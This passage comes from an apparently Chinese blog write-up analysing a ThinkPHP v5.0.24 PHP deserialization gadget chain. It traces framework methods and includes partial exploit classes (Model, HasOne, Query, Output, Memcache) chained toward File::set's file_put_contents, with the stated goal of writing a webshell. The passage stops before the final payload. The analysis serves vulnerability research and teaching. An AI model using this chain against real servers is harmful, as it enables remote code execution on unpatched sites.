class="variable">$name</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">"/[A-Z]/"</span>, <span class="string">"_\\0"</span>, <span class="variable">$name</span>), <span class="string">"_"</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>就是对传入的参数进行了大小写转换和特殊符号转换，对正常字符串没有影响</p>
<p>我们想要达到912行还需要满足三个条件：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)                  <span class="comment">// 自身中存在$relation方法</span></span><br><span class="line"><span class="comment">//$modelRelation = $this-&gt;$relation();</span></span><br><span class="line">method_exists(<span class="variable">$modelRelation</span>, <span class="string">'getBindAttr'</span>)     <span class="comment">// $modelRelation类中存在getBindAttr方法</span></span><br><span class="line"><span class="comment">//$bindAttr = $modelRelation-&gt;getBindAttr();</span></span><br><span class="line"><span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr()        <span class="comment">// $modelRelation-&gt;getBindAttr()的返回值为true</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])                         <span class="comment">// $this-&gt;data[$key]不存在</span></span><br></pre></td></tr></tbody></table></figure>

<p>首先<code>$relation</code>其实就是<code>$name</code>，<code>$name</code>是<code>$this→append</code>的值，故可控，并且该方法的返回值必须得存在<code>getBindAttr</code>方法才能满足第二个条件</p>
<p>我们先去找一下该类的哪一个方法可以返回一个任意的类对象，使用正则匹配<code>return \$this-&gt;.*</code>，我们能和找到不少可以利用的，我们使用逻辑简单的利用</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>我们只需要给<code>$this→error</code>赋值即可返回想要的类对象，我们再去全局搜索有<code>getBindAttr</code>方法的类，只找到了一个OneToOne抽象类，所以还需要搜索<code>extends OneToOne</code></p>
<p>然后我们找到了<code>HasOne</code>和<code>BelongsTo</code>类，二者都可利用，这里我们使用<code>HasOne</code></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindAttr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>然后需要满足第三个条件就需要使得<code>getBindAttr</code>方法返回一个<code>true</code>值，这里也是可控的，最后一个条件因为<code>$this→data</code>默认为空并且也是可控的，故很好满足</p>
<p>但是成功到达目的地后我们需要让<code>$value</code>为一个类对象从而实现向<code>__call</code>的跳转</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>如之前所说<code>$modelRelation</code>是<code>HasOne</code>类示例，进入<code>getRelationData</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) {</span><br><span class="line">        <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// 首先获取关联数据</span></span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">'getRelation'</span>)) {</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;getRelation();</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">'method not exists:'</span> . get_class(<span class="variable">$modelRelation</span>) . <span class="string">'-&gt; getRelation'</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><strong>642行</strong>处我们可以获得我们想要的结果在<strong>651行</strong>返回，所以我们需要满足<code>if</code>语句的条件</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parent       <span class="comment">// 不为空</span></span><br><span class="line">!<span class="variable">$modelRelation</span>-&gt;isSelfRelation()     <span class="comment">// Relation::isSelfRelation返回值为false</span></span><br><span class="line">get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent))   <span class="comment">// Relation::getModel返回值类型和$this-&gt;parent相同</span></span><br></pre></td></tr></tbody></table></figure>

<p><code>$this→parent</code>可控，查看<code>Relation::isSelfRelation</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isSelfRelation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;selfRelation;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>$this-&gt;selfRelation</code>可控，查看<code>Relation::getModel</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query-&gt;getModel();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%205.png" alt="Untitled"></p>
<p>可控且默认为Query类，查看getModel方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;model;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>$this-&gt;model</code>可控，只需要让它和<code>$this-&gt;parent</code>类型相同即可，<code>$this-&gt;parent</code>又和<code>$value</code>相同，故我们先寻找<code>__call</code>方法，这里感觉也有好几个利用点，选择一个<code>Output</code>进行利用</p>
<p>于是我们编写这块的exp如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"getError"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">				<span class="built_in">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">"seizer"</span>, <span class="string">"seizer"</span>];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Output-php过渡"><a href="#Output-php过渡" class="headerlink" title="Output.php过渡"></a>Output.php过渡</h2><p>跳转至<code>__call</code>方法，这里传入的第一个参数为”getAttr”和<code>$this-&gt;bindAttr</code>的值”seizer”，第二个参数为可控值</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) // <span class="title">getAttr</span>, ["<span class="title">seizer</span>"]</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;styles)) {</span><br><span class="line">        array_unshift(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">'block'</span>], <span class="variable">$args</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>)) {</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">__CLASS__</span> . <span class="string">'-&gt;'</span> . <span class="variable">$method</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>$this→styles</code>可控，这里我们进入第一<code>if</code>进行追踪，跳转至<code>block</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>) // <span class="title">getAttr</span>, <span class="title">seizer</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">"&lt;<span class="subst">{$style}</span>&gt;<span class="subst">{$message}</span>&lt;/<span class="subst">$style</span>&gt;"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>跳转至<code>writeln</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>) // &lt;<span class="title">getAttr</span>&gt;<span class="title">seizer</span>&lt;/<span class="title">getAttr</span>&gt;</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>跳转至<code>write</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>) // &lt;<span class="title">getAttr</span>&gt;<span class="title">seizer</span>&lt;/<span class="title">getAttr</span>&gt;</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;write(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>$this→handle</code>可控，搜索还有哪些类有可利用的<code>write</code>，这里选择Memcache.php中的<code>write</code>方法</p>
<p>编写这部分的exp：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcache();</span><br><span class="line">				<span class="keyword">$this</span>-&gt;styles = [<span class="string">'getAttr'</span>];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Memcache-php过渡"><a href="#Memcache-php过渡" class="headerlink" title="Memcache.php过渡"></a>Memcache.php过渡</h2><p>跳转至<code>write</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>) // &lt;<span class="title">getAttr</span>&gt;<span class="title">seizer</span>&lt;/<span class="title">getAttr</span>&gt;, <span class="title">flase</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">'session_name'</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;config[<span class="string">'expire'</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>$this→headler</code>可控，查看可跳转的<code>set</code>方法，这里选择了File.php的<code>set</code>方法进行利用</p>
<p>构造该部分的exp：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">SessionHandler</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> <span class="keyword">extends</span> <span class="title">SessionHandler</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="File-php终点"><a href="#File-php终点" class="headerlink" title="File.php终点"></a>File.php终点</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) // &lt;<span class="title">getAttr</span>&gt;<span class="title">seizer</span>&lt;/<span class="title">getAttr</span>&gt;, <span class="title">flase</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) {</span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) {</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;getTimestamp() - time();</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file(<span class="variable">$filename</span>)) {</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) {</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$data</span>   = <span class="string">"&lt;\?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, <span class="variable">$expire</span>) . <span class="string">"\n exit();?&gt;\n"</span> . <span class="variable">$data</span>;</span><br><span class="line">    var_dump(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    var_dump(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) {</span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem(<span class="variable">$filename</span>);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>163行处存在危险函数<code>file_put_contents</code>，我们想办法加以利用写入webshell</p>
<p>149行<code>$filenama</code>由参数<code>$name</code>经过<code>getCacheKey</code>方法处理后的值</p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%206.png" alt="Untitled"></p>
<p>其中<code>$this-&gt;options</code>可控，可以让<code>cache_subdir</code>为<code>false</code>，让返回的<code>$filename = $this-&gt;options['path'] . $name . '.php';</code>，故<code>$filename</code>前部分内容可控</p>
<p><code>$data</code>则是第二个参数<code>$value</code>的序列化值，不可控，再执行<code>file_put_contents</code>时还未能写入任意内容</p>
<p>进入161行调用的setTagItem方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) {</span><br><span class="line">        <span class="variable">$key</span>       = <span class="string">'tag_'</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has(<span class="variable">$key</span>)) {</span><br><span class="line">            <span class="variable">$value</span>   = explode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>));</span><br><span class="line">            <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">            <span class="variable">$value</span>   = implode(<span class="string">','</span>, array_unique(<span class="variable">$value</span>));</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里200行再次调用<code>set</code>方法，且此时的第二个参数变为可控值，为<code>$name</code>也就是刚才的<code>$filename</code></p>
